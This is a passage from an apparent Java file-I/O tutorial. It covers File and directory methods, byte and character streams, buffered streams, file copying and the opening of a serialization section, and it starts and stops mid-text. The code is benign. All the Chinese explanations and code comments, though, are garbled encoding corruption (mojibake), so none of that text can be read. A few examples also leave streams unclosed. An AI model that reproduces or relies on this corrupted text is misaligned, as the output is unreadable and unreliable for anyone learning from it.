System.out.println(\"æ–‡ä»¶åå­—=\" + file.getName());\n        System.out.println(\"æ–‡ä»¶ç»å¯¹è·¯å¾„=\" + file.getAbsolutePath());\n        System.out.println(\"æ–‡ä»¶çˆ¶çº§ç›®å½•=\" + file.getParent());\n        System.out.println(\"æ–‡ä»¶å¤§å°(å­—èŠ‚)=\" + file.length());//ä¸­æ–‡å­—ç¬¦3ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡å­—ç¬¦1ä¸ªå­—èŠ‚\n        System.out.println(\"æ–‡ä»¶æ˜¯å¦å­˜åœ¨=\" + file.exists());//T\n        System.out.println(\"æ˜¯ä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶=\" + file.isFile());//T\n        System.out.println(\"æ˜¯ä¸æ˜¯ä¸€ä¸ªç›®å½•=\" + file.isDirectory());//F\n    }\n}\n```\n\n### ç›®å½•æ“ä½œ\n\n- mkdir()   åˆ›å»ºä¸€çº§ç›®å½•\n\n- mkdirs()  åˆ›å»ºå¤šçº§ç›®å½•\n\n- delete()    åˆ é™¤ç©ºç›®å½•æˆ–æ–‡ä»¶\n\n**å®ä¾‹ï¼š**\n\n1) åˆ¤æ–­ /Users/jianjian/Downloads/test.txt æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±åˆ é™¤ã€‚\n2) åˆ¤æ–­ /Users/jianjian/Downloads/test ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±æç¤ºå·²ç»å­˜åœ¨ï¼Œå¦åˆ™å°±åˆ›å»ºã€‚\n3) åˆ¤æ–­ /Users/jianjian/Downloads/test/a/b  ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±æç¤ºå·²ç»å­˜åœ¨ï¼Œå¦åˆ™å°±åˆ›å»ºã€‚\n\n```java\nimport org.junit.Test;\nimport java.io.File;\n\npublic class Directory_ {\n\n    //1) åˆ¤æ–­ /Users/jianjian/Downloads/test.txt æ–‡ä»¶æ˜¯å¦å­˜åœ¨å¦‚æœå­˜åœ¨å°±åˆ é™¤ã€‚\n    @Test\n    public void Q1(){\n        String fileName = \"/Users/jianjian/Downloads/test.txt\";\n        File file = new File(fileName);\n        if (file.exists()) {\n            System.out.println(file.getName()+\"æ–‡ä»¶å­˜åœ¨\");\n            if (file.delete()) {\n                System.out.println(file.getName()+\"åˆ é™¤æˆåŠŸ\");\n            }\n        } else {\n            System.out.println(file.getName()+\"æ–‡ä»¶ä¸å­˜åœ¨\");\n        }\n    }\n\n    //2) åˆ¤æ–­ /Users/jianjian/Downloads/test ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±æç¤ºå·²ç»å­˜åœ¨ï¼Œå¦åˆ™å°±åˆ›å»ºã€‚\n    @Test\n    public void Q2(){\n        String fileName = \"/Users/jianjian/Downloads/test\";\n        File file = new File(fileName);\n        if (file.exists()) {\n            System.out.println(file.getName()+\"æ–‡ä»¶å­˜åœ¨\");\n        } else{\n            System.out.println(file.getName()+\"æ–‡ä»¶ä¸å­˜åœ¨\");\n            if (file.mkdir()) {\n                System.out.println(file.getName()+\"æ–‡ä»¶åˆ›å»ºæˆåŠŸ\");\n            } else{\n                System.out.println(file.getName()+\"æ–‡ä»¶åˆ›å»ºå¤±è´¥\");\n            }\n        }\n    }\n\n    //3) åˆ¤æ–­ /Users/jianjian/Downloads/test/a/b  ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±æç¤ºå·²ç»å­˜åœ¨ï¼Œå¦åˆ™å°±åˆ›å»ºã€‚\n    @Test\n    public void Q3(){\n        String fileName = \"/Users/jianjian/Downloads/test/a/b\";\n        File file = new File(fileName);\n        if (file.exists()) {\n            System.out.println(file.getName()+\"æ–‡ä»¶å­˜åœ¨\");\n        } else{\n            System.out.println(file.getName()+\"æ–‡ä»¶ä¸å­˜åœ¨\");\n            if (file.mkdirs()) {\n                System.out.println(file.getName()+\"æ–‡ä»¶åˆ›å»ºæˆåŠŸ\");\n            } else{\n                System.out.println(file.getName()+\"æ–‡ä»¶åˆ›å»ºå¤±è´¥\");\n            }\n        }\n    }\n}\n```\n\n## å­—èŠ‚æµ\n\n### FileInputStream\n\n- read()   //å•å­—èŠ‚è¯»å–\n- read(byte[] b)  //å¤šå­—èŠ‚è¯»å–\n\nè¯·ä½¿ç”¨ FileInputStream è¯»å– hello.txt æ–‡ä»¶ï¼Œå¹¶å°†æ–‡ä»¶å†…å®¹æ˜¾ç¤ºåˆ°æ§åˆ¶å°\n\n#### å•å­—èŠ‚è¯»å–\n\n```java\nimport org.junit.Test;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class FileInputStream_ {\n    @Test\n    public void readFile01() {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        int readData = 0;\n        FileInputStream fileInputStream = null;\n        try {\n            //åˆ›å»ºFileInputStream å¯¹è±¡ï¼Œç”¨äºè¯»å–æ–‡ä»¶\n            fileInputStream = new FileInputStream(filePath);\n            //ä»è¯¥è¾“å…¥æµè¯»å–ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚å¦‚æœæ²¡æœ‰è¾“å…¥å¯ç”¨ï¼Œæ­¤æ–¹æ³•å°†é˜»æ­¢ã€‚\n            //å¦‚æœè¿”å›-1 , è¡¨ç¤ºè¯»å–å®Œæ¯•\n            while ((readData = fileInputStream.read()) != -1) {\n                System.out.print((char) readData);//è½¬æˆchar æ˜¾ç¤º\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            //å…³é—­æ–‡ä»¶æµï¼Œé‡Šæ”¾èµ„æº.\n            try {\n                fileInputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n#### å¤šå­—èŠ‚è¯»å–\n\n```java\nimport org.junit.Test;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class FileInputStream_ {\n    @Test\n    public void readFile02() {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        int readLen = 0;\n        byte[] buf = new byte[8];//ä¸€æ¬¡è¯»å–8ä¸ªå­—èŠ‚.\n        FileInputStream fileInputStream = null;\n        try {\n            //åˆ›å»ºFileInputStream å¯¹è±¡ï¼Œç”¨äºè¯»å–æ–‡ä»¶\n            fileInputStream = new FileInputStream(filePath);\n            //ä»è¯¥è¾“å…¥æµè¯»å–æœ€å¤šb.length å­—èŠ‚çš„æ•°æ®åˆ°å­—èŠ‚æ•°ç»„ã€‚\n            //å¦‚æœè¿”å›-1 , è¡¨ç¤ºè¯»å–å®Œæ¯•\n            //å¦‚æœè¯»å–æ­£å¸¸, è¿”å›å®é™…è¯»å–çš„å­—èŠ‚æ•°\n            while ((readLen = fileInputStream.read(buf)) != -1) {\n                System.out.print(new String(buf,0,readLen));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            //å…³é—­æ–‡ä»¶æµï¼Œé‡Šæ”¾èµ„æº.\n            try {\n                fileInputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n### FileOutputStream\n\n-  åˆ›å»ºæ–¹å¼\n  - new FileOutputStream(filePath)  //å½“å†™å…¥å†…å®¹æ—¶ï¼Œä¼šè¦†ç›–åŸæ¥çš„å†…å®¹\n  - new FileOutputStream(filePath, true)  //å½“å†™å…¥å†…å®¹æ—¶ï¼Œæ˜¯è¿½åŠ åˆ°åŸæ¥çš„å†…å®¹åé¢\n- å†™å…¥æ–¹å¼\n  - write(byte[] b); //å•å­—èŠ‚å†™å…¥\n  - write(byte[] b, int off, int len) //å°† lenå­—èŠ‚ä»ä½äºåç§»é‡off çš„æŒ‡å®šå­—èŠ‚æ•°ç»„å†™å…¥æ­¤æ–‡ä»¶è¾“å‡ºæµ\n\nä¾‹å­1ğŸŒ°ï¼šè¯·ä½¿ç”¨ FileOutputStream åœ¨ a.txt æ–‡ä»¶ä¸­å†™å…¥ â€œhelloï¼Œworldâ€ï¼Œ å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¼šåˆ›å»ºæ–‡ä»¶(æ³¨æ„ï¼šå‰ææ˜¯ç›®å½•å·²ç»å­˜åœ¨)\n\n```java\npackage com.jwt.outputstream_;\n\nimport org.junit.Test;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FileOutputStream_ {\n\n    @Test\n    public void writeFile01(){\n        String filePath = \"/Users/jianjian/Downloads/a.txt\";\n        FileOutputStream fileOutputStream = null;\n        try {\n            fileOutputStream = new FileOutputStream(filePath);//è¦†ç›–\n            fileOutputStream.write('J');\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Test\n    public void writeFile02(){\n        String filePath = \"/Users/jianjian/Downloads/a.txt\";\n        FileOutputStream fileOutputStream = null;\n        String str = \"Hello,jwt\";\n        try {\n            fileOutputStream = new FileOutputStream(filePath,true);//è¿½åŠ \n            //str.getBytes() å¯ä»¥æŠŠå­—ç¬¦ä¸²-> å­—èŠ‚æ•°ç»„\n            fileOutputStream.write(str.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Test\n    public void writeFile03(){\n        String filePath = \"/Users/jianjian/Downloads/a.txt\";\n        FileOutputStream fileOutputStream = null;\n        String str = \"Hello,jwt\";\n        try {\n            fileOutputStream = new FileOutputStream(filePath);\n            fileOutputStream.write(str.getBytes(), 0, str.length());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n}\n```\n\nä¾‹å­1ğŸŒ°ï¼šç¼–ç¨‹å®Œæˆå›¾ç‰‡çš„æ‹·è´ï¼Œå°† /Users/jianjian/Downloads/a.jpg æ‹·è´åˆ° /Users/jianjian/Downloads/test/a.jpgï¼Œå³è¾“å…¥æµå’Œè¾“å‡ºæµåŒæ—¶ä½¿ç”¨\n\n```java\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FileCopy {\n    public static void main(String[] args) {\n        String srcFilePath = \"/Users/jianjian/Downloads/a.jpeg\";\n        String destFilePath = \"/Users/jianjian/Downloads/test/a.jpeg\";\n        FileInputStream fileInputStream = null;\n        FileOutputStream fileOutputStream = null;\n        try {\n            fileInputStream = new FileInputStream(srcFilePath);\n            fileOutputStream = new FileOutputStream(destFilePath);\n            //å®šä¹‰ä¸€ä¸ªå­—èŠ‚æ•°ç»„,æé«˜è¯»å–æ•ˆæœ\n            byte[] buf = new byte[1024];\n            int readLen = 0;\n            while ((readLen = fileInputStream.read(buf)) != -1) {\n                //è¯»å–åˆ°åï¼Œå°±å†™å…¥åˆ°æ–‡ä»¶é€šè¿‡fileOutputStream\n                //å³ï¼Œæ˜¯ä¸€è¾¹è¯»ï¼Œä¸€è¾¹å†™\n                fileOutputStream.write(buf, 0, readLen);//ä¸€å®šè¦ä½¿ç”¨è¿™ä¸ªæ–¹æ³•\n            }\n            System.out.println(\"æ‹·è´ok~\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                //å…³é—­è¾“å…¥æµå’Œè¾“å‡ºæµï¼Œé‡Šæ”¾èµ„æº\n                if (fileInputStream != null) {\n                    fileInputStream.close();\n                }\n                if (fileOutputStream != null) {\n                    fileOutputStream.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n## å­—ç¬¦æµ\n\n### FileReader\n\n- new FileReader(File/String)\n- read()ï¼šæ¯æ¬¡è¯»å–å•ä¸ªå­—ç¬¦ï¼Œè¿”å›è¯¥å­—ç¬¦ï¼Œå¦‚æœåˆ°æ–‡ä»¶æœ«å°¾è¿”å›-1\n- read(char[])ï¼šæ‰¹é‡è¯»å–å¤šä¸ªå­—ç¬¦åˆ°æ•°ç»„ï¼Œè¿”å›è¯»å–åˆ°çš„å­—ç¬¦æ•°ï¼Œå¦‚æœåˆ°æ–‡ä»¶æœ«å°¾è¿”å›-1\n- ç›¸å…³API:\n  - new String(char[]):å°†char[]è½¬æ¢æˆString\n  - new String(char[],off,len):å°†char[]çš„æŒ‡å®šéƒ¨åˆ†è½¬æ¢æˆString\n\nä¾‹å­ğŸŒ°ï¼šä½¿ç”¨ FileReader ä» hello.txt è¯»å–å†…å®¹ï¼Œå¹¶æ˜¾ç¤º\n\n```java\nimport org.junit.Test;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class FileReader_ {\n    /**\n     * å•ä¸ªå­—ç¬¦è¯»å–æ–‡ä»¶\n     */\n    @Test\n    public void readFile01() {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        FileReader fileReader = null;\n        int data = 0;\n        try {\n            //åˆ›å»ºFileReader å¯¹è±¡\n            fileReader = new FileReader(filePath);\n            //å¾ªç¯è¯»å–ä½¿ç”¨read, å•ä¸ªå­—ç¬¦è¯»å–\n            while ((data = fileReader.read()) != -1) {\n                System.out.print((char) data);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (fileReader != null) {\n                    fileReader.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    /**\n     * å­—ç¬¦æ•°ç»„è¯»å–æ–‡ä»¶\n     */\n    @Test\n    public void readFile02() {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        FileReader fileReader = null;\n        int readLen = 0;\n        char[] buf = new char[8];\n        try {\n            //åˆ›å»ºFileReader å¯¹è±¡\n            fileReader = new FileReader(filePath);\n            //å¾ªç¯è¯»å–ä½¿ç”¨read(buf), è¿”å›çš„æ˜¯å®é™…è¯»å–åˆ°çš„å­—ç¬¦æ•°\n            //å¦‚æœè¿”å›-1, è¯´æ˜åˆ°æ–‡ä»¶ç»“æŸ\n            while ((readLen = fileReader.read(buf)) != -1) {\n                System.out.print(new String(buf, 0, readLen));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (fileReader != null) {\n                    fileReader.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n### FileWriter\n\n- åˆ›å»º\n\n  - newFileWriter(File/String)ï¼šè¦†ç›–æ¨¡å¼ï¼Œç›¸å½“äºæµçš„æŒ‡é’ˆåœ¨é¦–ç«¯\n\n  - new FileWriter(File/String,true)ï¼šè¿½åŠ æ¨¡å¼ï¼Œç›¸å½“äºæµçš„æŒ‡é’ˆåœ¨å°¾ç«¯\n\n- å†™å…¥\n\n  - write(int);å†™å…¥å•ä¸ªå®‡ç¬¦\n\n  - write(char[])ï¼šå†™å…¥æŒ‡å®šæ•°ç»„\n\n  - write(char[],off,len):å†™å…¥æŒ‡å®šæ•°ç»„çš„æŒ‡å®šéƒ¨åˆ†\n\n  - write (string)ï¼šå†™å…¥æ•´ä¸ªå­—ç¬¦ä¸²\n\n  - write(string,off,len):å†™å…¥å­—ç¬¦ä¸²çš„æŒ‡å®šéƒ¨åˆ†\n\n- ç›¸å…³APlï¼š\n  - Stringç±»ï¼štoCharArray:å°†Stringè½¬æ¢æˆchar[]\n- æ³¨æ„ï¼šFileWriterä½¿ç”¨åï¼Œå¿…é¡»è¦å…³é—­(close)æˆ–åˆ·æ–°(flush)ï¼Œå¦åˆ™å†™å…¥ä¸åˆ°æŒ‡å®šçš„æ–‡ä»¶ï¼\n\nä¾‹å­ğŸŒ°ï¼šä½¿ç”¨ FileWriter å°† â€œHello,Worldâ€ å†™å…¥åˆ° hello.txt æ–‡ä»¶ä¸­\n\n```java\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class FileWriter_ {\n    public static void main(String[] args) {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        //åˆ›å»ºFileWriter å¯¹è±¡\n        FileWriter fileWriter = null;\n        char[] chars = {'a', 'b', 'c'};\n        try {\n            fileWriter = new FileWriter(filePath);//é»˜è®¤æ˜¯è¦†ç›–å†™å…¥\n            // 1) write(int):å†™å…¥å•ä¸ªå­—ç¬¦\n            fileWriter.write('H');\n            // 2) write(char[]):å†™å…¥æŒ‡å®šæ•°ç»„\n            fileWriter.write(chars);\n            // 3) write(char[],off,len):å†™å…¥æŒ‡å®šæ•°ç»„çš„æŒ‡å®šéƒ¨åˆ†\n            fileWriter.write(\"åŠ æ²¹å•Šå°ç®€\".toCharArray(), 0, 3);\n            // 4) writeï¼ˆstringï¼‰ï¼šå†™å…¥æ•´ä¸ªå­—ç¬¦ä¸²\n            fileWriter.write(\" ä½ å¥½å•Š~\");\n            // 5)write(string, off, len):å†™å…¥å­—ç¬¦ä¸²çš„æŒ‡å®šéƒ¨åˆ†\n            fileWriter.write(\"ä¸€èµ·å­¦Java\", 0, 2);\n        //åœ¨æ•°æ®é‡å¤§çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨å¾ªç¯æ“ä½œ.\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            //å¯¹äºFileWriter , ä¸€å®šè¦å…³é—­æµï¼Œæˆ–è€…flush æ‰èƒ½çœŸæ­£çš„æŠŠæ•°æ®å†™å…¥åˆ°æ–‡ä»¶\n            try {\n                //fileWriter.flush();\n                //å…³é—­æ–‡ä»¶æµï¼Œç­‰ä»·flush() + å…³é—­\n                fileWriter.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"ç¨‹åºç»“æŸ...\");\n    }\n}\n```\n\n## èŠ‚ç‚¹æµ&å¤„ç†æµ\n\n- èŠ‚ç‚¹æµå¯ä»¥ä»ä¸€ä¸ªç‰¹å®šçš„æ•°æ®æºè¯»å†™æ•°æ®ï¼Œå¦‚FileReaderã€ FileWriter\n\n- å¤„ç†æµ(ä¹Ÿå«åŒ…è£…æµ)æ˜¯\"è¿æ¥â€åœ¨å·²å­˜åœ¨çš„æµ(èŠ‚ç‚¹æµæˆ–å¤„ç†æµ)ä¹‹ä¸Šï¼Œä¸ºç¨‹åºæä¾›æ›´ä¸ºå¼ºå¤§çš„è¯»å†™åŠŸèƒ½ï¼Œä¹Ÿæ›´åŠ çµæ´»ï¼Œå¦‚BufferedReaderã€BufferedWriter\n\n### èŠ‚ç‚¹æµå’Œå¤„ç†æµä¸€è§ˆå›¾\n\n![](https://img.jwt1399.top/img/image-20220301205129667.png)\n\n### èŠ‚ç‚¹æµå’Œå¤„ç†æµåŒºåˆ«\n\n- èŠ‚ç‚¹æµæ˜¯åº•å±‚æµ/ä½çº§æµï¼Œç›´æ¥è·Ÿæ•°æ®æºç›¸æ¥ã€‚\n- å¤„ç†æµå¯¹èŠ‚ç‚¹æµè¿›è¡ŒåŒ…è£…ï¼Œä½¿ç”¨äº†ä¿®é¥°å™¨è®¾è®¡æ¨¡å¼ï¼Œä¸ä¼šç›´æ¥ä¸æ•°æ®æºç›¸è¿ï¼Œæ—¢å¯ä»¥æ¶ˆé™¤ä¸åŒèŠ‚ç‚¹æµçš„å®ç°å·®å¼‚ï¼Œä¹Ÿå¯ä»¥æä¾›æ›´æ–¹ä¾¿çš„æ–¹æ³•æ¥å®Œæˆè¾“å…¥è¾“å‡ºã€‚\n\n## å¤„ç†æµä¹‹ç¼“å†²æµ\n\n### BufferedReader\n\n\nä½¿ç”¨ BufferedReader è¯»å–æ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶æ˜¾ç¤ºåœ¨æ§åˆ¶å°\n\n```java\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class BufferedReader_ {\n    public static void main(String[] args) throws IOException {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        //åˆ›å»ºbufferedReader\n        BufferedReader bufferedReader = new BufferedReader(new FileReader(filePath));\n        //è¯»å–\n        String line; //æŒ‰è¡Œè¯»å–, æ•ˆç‡é«˜\n        //1. bufferedReader.readLine() æ˜¯æŒ‰è¡Œè¯»å–æ–‡ä»¶\n        //2. å½“è¿”å›null æ—¶ï¼Œè¡¨ç¤ºæ–‡ä»¶è¯»å–å®Œæ¯•\n        while ((line = bufferedReader.readLine()) != null) {\n            System.out.println(line);\n        }\n        //å…³é—­æµ, è¿™é‡Œæ³¨æ„ï¼Œåªéœ€è¦å…³é—­BufferedReader ï¼Œå› ä¸ºåº•å±‚ä¼šè‡ªåŠ¨çš„å»å…³é—­èŠ‚ç‚¹æµ\n        bufferedReader.close();\n    }\n}\n```\n\n**å…³é—­æµæ—¶ï¼Œåªéœ€è¦å…³é—­å¤–å±‚æµ(å¤„ç†æµ)å³å¯ï¼Œå› ä¸ºåº•å±‚ä¼šè‡ªåŠ¨çš„å»å…³é—­èŠ‚ç‚¹æµ**\n\n###  BufferedWriter\n\nä½¿ç”¨ BufferedWriter å°† â€hello, Worldâ€ï¼Œå†™å…¥åˆ°æ–‡ä»¶ä¸­\n\n```java\npackage com.jwt.writer_;\n\nimport java.io.BufferedWriter;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class BufferedWriter_ {\n    public static void main(String[] args) throws IOException {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(filePath,true));//ä»¥è¿½åŠ çš„æ–¹å¼å†™å…¥\n        bufferedWriter.write(\"Hello,World\");\n        bufferedWriter.newLine();//æ’å…¥ä¸€ä¸ªå’Œç³»ç»Ÿç›¸å…³çš„æ¢è¡Œ\n        bufferedWriter.write(\"Hi,World\");\n        bufferedWriter.newLine();\n        //å…³é—­å¤–å±‚æµå³å¯ï¼Œ ä¼ å…¥çš„new FileWriter(filePath) ,ä¼šåœ¨åº•å±‚å…³é—­\n        bufferedWriter.close();\n    }\n}\n```\n\nä¾‹å­ğŸŒ°ï¼šç»¼åˆä½¿ç”¨ BufferedReader å’Œ BufferedWriter å®Œæˆ**æ–‡æœ¬æ–‡ä»¶**æ‹·è´ï¼Œæ³¨æ„æ–‡ä»¶ç¼–ç \n\n- BufferedReader å’Œ BufferedWriter æ˜¯æŒ‰ç…§å­—ç¬¦æ“ä½œ\n- ä¸è¦å»æ“ä½œäºŒè¿›åˆ¶æ–‡ä»¶[å£°éŸ³ï¼Œè§†é¢‘ï¼Œdoc, pdf ], å¯èƒ½é€ æˆæ–‡ä»¶æŸå\n\n```java\npackage com.jwt.writer_;\n\nimport java.io.*;\n\npublic class BufferedCopy_ {\n    public static void main(String[] args) {\n        String srcFilePath = \"/Users/jianjian/Downloads/hello.txt\";\n        String destFilePath = \"/Users/jianjian/Downloads/test/hello.txt\";\n        BufferedReader bufferedReader = null;\n        BufferedWriter bufferedWriter = null;\n        String data;\n        try {\n            bufferedReader = new BufferedReader(new FileReader(srcFilePath));\n            bufferedWriter = new BufferedWriter(new FileWriter(destFilePath));\n            //è¯´æ˜: readLine è¯»å–ä¸€è¡Œå†…å®¹ï¼Œä½†æ˜¯æ²¡æœ‰æ¢è¡Œ\n            while ((data=bufferedReader.readLine()) != null) {\n                //æ¯è¯»å–ä¸€è¡Œï¼Œå°±å†™å…¥\n                bufferedWriter.write(data);\n                //æ’å…¥ä¸€ä¸ªæ¢è¡Œ\n                bufferedWriter.newLine();\n            }\n            System.out.println(\"æ‹·è´å®Œæ¯•...\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            try {\n                //å…³é—­æµ\n                if (bufferedReader != null){\n                    bufferedReader.close();\n                }\n               if (bufferedWriter != null){\n                   bufferedWriter.close();\n               }\n\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n### BufferedInputStream & BufferedOutputStream\n\n- BufferedInputStream æ˜¯å­—èŠ‚æµï¼Œåœ¨åˆ›å»º BufferedInputStreamæ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªå†…éƒ¨ç¼“å†²åŒºæ•°ç»„\n\n- BufferedOutputStream æ˜¯å­—èŠ‚æµï¼Œå®ç°ç¼“å†²çš„è¾“å‡ºæµï¼Œå¯ä»¥å°†å¤šä¸ªå­—èŠ‚å†™å…¥åº•å±‚è¾“å‡ºæµä¸­ï¼Œè€Œä¸å¿…å¯¹æ¯æ¬¡å­—èŠ‚å†™å…¥è°ƒç”¨åº•å±‚ç³»ç»Ÿ\n\nä¾‹å­ğŸŒ°ï¼šç¼–ç¨‹å®Œæˆ**å›¾ç‰‡/éŸ³ä¹**çš„æ‹·è´(è¦æ±‚ä½¿ç”¨Buffered..æµ)\n\n```java\npackage com.jwt.writer_;\n\nimport java.io.*;\n\npublic class BufferedCopy02 {\n    public static void main(String[] args) {\n        String srcFilePath = \"/Users/jianjian/Downloads/a.jpeg\";\n        String destFilePath = \"/Users/jianjian/Downloads/test/a.jpeg\";\n        BufferedInputStream bufferedInputStream = null;\n        BufferedOutputStream bufferedOutputStream = null;\n        int data;\n        try {\n            bufferedInputStream = new BufferedInputStream(new FileInputStream(srcFilePath));\n            bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(destFilePath));\n            //å¾ªç¯çš„è¯»å–æ–‡ä»¶ï¼Œå¹¶å†™å…¥åˆ°destFilePath\n            byte[] buff = new byte[1024];\n            int readLen = 0;\n            //å½“è¿”å›-1 æ—¶ï¼Œå°±è¡¨ç¤ºæ–‡ä»¶è¯»å–å®Œæ¯•\n            while ((readLen=bufferedInputStream.read(buff)) != -1) {\n                //æ¯è¯»å–ä¸€è¡Œï¼Œå°±å†™å…¥\n                bufferedOutputStream.write(buff,0,readLen);\n            }\n            System.out.println(\"æ‹·è´å®Œæ¯•...\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            try {\n                //å…³é—­æµ\n                if (bufferedInputStream != null){\n                    bufferedInputStream.close();\n                }\n                if (bufferedOutputStream != null){\n                    bufferedOutputStream.close();\n                }\n\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n## å¤„ç†æµä¹‹å¯¹è±¡æµ\n\nå¯¹è±¡åŠŸèƒ½ï¼šæä¾›äº†å¯¹åŸºæœ¬ç±»å‹æˆ–å¯¹è±¡ç±»å‹çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•\n\n**çœ‹ä¸€ä¸ªéœ€æ±‚**\n\n- 1.å°† int num = 100 è¿™ä¸ª int æ•°æ®ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæ³¨æ„ä¸æ˜¯ 100 æ•°å­—ï¼Œè€Œæ˜¯ int 100ï¼Œå¹¶ä¸”èƒ½å¤Ÿä»æ–‡ä»¶ä¸­ç›´æ¥æ¢å¤ int 100\n- 2.å°† Dog dog = new Dog(\"å°é»„â€ï¼Œ3) è¿™ä¸ª dog å¯¹è±¡ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”èƒ½å¤Ÿä»æ–‡ä»¶æ¢å¤\n- 3.ä¸Šé¢çš„è¦æ±‚ï¼Œå°±æ˜¯èƒ½å¤Ÿå°†åŸºæœ¬æ•°æ®ç±»å‹æˆ–è€…å¯¹è±¡è¿›è¡Œ**åºåˆ—åŒ–**å’Œ**ååºåˆ—åŒ–**æ“ä½œ\n\n**åºåˆ—åŒ–å’Œååºåˆ—åŒ–**\n\n- åºåˆ—åŒ–å°±æ˜¯åœ¨ä¿å­˜æ•°æ®æ—¶ï¼Œä¿å­˜æ•°æ®çš„å€¼å’Œæ•°æ®ç±»å‹\n- ååºåˆ—åŒ–å°±æ˜¯åœ¨æ¢å¤æ•°æ®æ—¶ï¼Œæ¢å¤æ•°æ®çš„å€¼å’Œæ•°æ®ç±»å‹\n- éœ€è¦è®©æŸä¸ªå¯¹è±¡æ”¯æŒåºåˆ—åŒ–æœºåˆ¶ï¼Œåˆ™å¿…é¡»è®©å…¶ç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œä¸ºäº†è®©æŸä¸ªç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œè¯¥ç±»**å¿…é¡»å®ç°å¦‚ä¸‹ä¸¤ä¸ªæ¥å£ä¹‹ä¸€**ï¼š\n  - Serializable //è¿™æ˜¯ä¸€ä¸ªæ ‡è®°æ¥å£ï¼Œæ²¡æœ‰æ–¹æ³•\n  - Externalizable //è¯¥æ¥å£æœ‰æ–¹æ³•éœ€è¦å®ç°ï¼Œå› æ­¤æˆ‘ä»¬ä¸€èˆ¬å®ç°ä¸Šé¢çš„Serializableæ¥å£\n\n**æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚è¯´æ˜**\n\n- 1)è¯»å†™é¡ºåºè¦ä¸€è‡´\n- 2)è¦æ±‚åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–å¯¹è±¡ï¼Œéœ€è¦**å®ç° Serializable æ¥å£**\n- 3)åºåˆ—åŒ–çš„ç±»ä¸­å»ºè®®æ·»åŠ SerialVersionUID,ä¸ºäº†æé«˜ç‰ˆæœ¬çš„å…¼å®¹æ€§\n- 4)åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œé»˜è®¤å°†é‡Œé¢æ‰€æœ‰å±æ€§éƒ½è¿›è¡Œåºåˆ—åŒ–ï¼Œä½†é™¤äº†staticæˆ–transientä¿®é¥°çš„æˆå‘˜\n- 5)åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œè¦æ±‚é‡Œé¢å±æ€§çš„ç±»å‹ä¹Ÿéœ€è¦å®ç°åºåˆ—åŒ–æ¥å£\n- 